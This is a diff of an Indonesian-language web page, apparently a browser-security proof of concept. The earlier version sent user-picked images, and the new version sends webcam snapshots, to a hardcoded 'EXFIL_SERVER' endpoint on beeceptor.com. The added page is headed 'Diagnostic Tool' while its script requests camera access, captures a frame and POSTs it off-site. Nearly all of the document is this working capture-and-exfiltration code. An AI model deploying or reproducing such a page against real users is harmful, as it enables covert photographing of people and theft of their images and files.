@@ -2,70 +2,64 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Uji Coba Keamanan Browser</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uji Keamanan Kamera</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        button { padding: 15px 30px; font-size: 18px; margin: 10px; cursor: pointer; }
+        #status { margin-top: 20px; color: #555; }
+    </style>
 </head>
 <body>
-    <button id="trigger-btn" style="padding: 20px; font-size: 20px; cursor: pointer;">
-        Klik untuk Memulai Uji Coba
-    </button>
+    <h1>Diagnostic Tool</h1>
+    <button id="camera-btn">Ambil Foto & Exfil</button>
+    <div id="status">Menunggu interaksi...</div>
 
     <script>
-        // URL Beeceptor Anda yang sudah diperbarui
         const EXFIL_SERVER = "https://browser-bug-poc.free.beeceptor.com";
+        const statusDiv = document.getElementById('status');
 
-        document.getElementById('trigger-btn').addEventListener('click', async () => {
-            console.log("Memulai proses...");
-
-            // 1. Uji File Picker (Akses Galeri)
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.onchange = (e) => {
-                const file = e.target.files[0];
-                const reader = new FileReader();
-                reader.onload = (ev) => {
-                    fetch(EXFIL_SERVER, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ 
-                            type: 'uploaded file', 
-                            fileName: file.name, 
-                            data: ev.target.result 
-                        }),
-                        keepalive: true
-                    });
-                };
-                reader.readAsDataURL(file);
-            };
-            input.click();
-
-            // 2. Uji Akses Kamera
+        document.getElementById('camera-btn').addEventListener('click', async () => {
+            statusDiv.innerText = "Meminta izin...";
+            
             try {
+                // Mencoba mendapatkan akses kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                statusDiv.innerText = "Akses diberikan. Mengambil gambar...";
+                
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.play();
-                
-                // Menunggu stream siap
-                setTimeout(() => {
+                await video.play();
+
+                // Delay agar stream stabil
+                setTimeout(async () => {
                     const canvas = document.createElement('canvas');
-                    canvas.width = 320;
-                    canvas.height = 240;
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    fetch(EXFIL_SERVER, {
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // Kirim ke Beeceptor
+                    statusDiv.innerText = "Mengirim data...";
+                    await fetch(EXFIL_SERVER, {
                         method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ 
-                            type: 'camera_capture', 
-                            data: canvas.toDataURL('image/jpeg') 
-                        }),
-                        keepalive: true
+                            type: 'camera_capture_v2', 
+                            timestamp: new Date().toISOString(),
+                            data: imageData 
+                        })
                     });
-                    stream.getTracks().forEach(t => t.stop());
-                }, 1500);
-            } catch (err) { 
-                console.error("Akses kamera ditolak atau gagal:", err); 
+
+                    // Stop kamera
+                    stream.getTracks().forEach(track => track.stop());
+                    statusDiv.innerText = "Selesai: Foto berhasil dikirim.";
+                }, 1000);
+
+            } catch (err) {
+                statusDiv.innerText = "Gagal: " + err.message;
+                console.error(err);
             }
         });
     </script>
